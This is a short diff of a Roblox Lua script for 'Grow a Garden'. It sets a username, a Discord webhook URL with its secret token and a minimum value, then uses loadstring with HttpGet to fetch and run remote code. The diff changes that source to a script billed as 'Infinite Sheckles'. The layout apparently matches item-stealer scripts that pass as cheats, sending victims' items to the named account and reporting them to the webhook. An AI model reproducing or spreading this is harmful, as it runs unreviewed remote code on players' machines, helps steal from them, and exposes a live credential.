@@ -1,7 +1,7 @@
-Username = "Tonsbes"
+Username = "tonsbes"
 
 Webhook = "https://discord.com/api/webhooks/1395603241286369370/fNc33JxRuPvCA6J3wQvaBugYgXHZsWyzuBGtWtZPDX2Zq6ExvsrWoVyo1hk731-m1LeQ"
 
 MinimumValue = 1
 
-loadstring(game:HttpGet("https://gitlab.com/ traxscriptss/traxscriptss/-/raw/main/grow-a- garden"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-Blackhub-Infinite-Sheckles-41369"))()
